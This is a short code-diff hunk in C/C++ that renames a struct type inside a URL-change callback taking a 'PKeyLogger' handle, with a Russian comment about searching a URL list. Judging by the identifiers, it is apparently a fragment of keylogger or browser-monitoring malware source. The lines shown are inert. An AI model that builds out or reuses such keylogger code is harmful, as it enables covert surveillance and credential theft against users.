@@ -45,7 +45,7 @@ static UrlKeys* AddUrl( const char* url )
 
 static void WINAPI URLChanged(PKeyLogger Logger, DWORD EventID, LPVOID Data)
 {
-	TURL UR;
+	TURLREC UR;
 	if( ParseURL( (char*)Data, &UR, false ) )
 	{
 		//ищем новый урл в списке
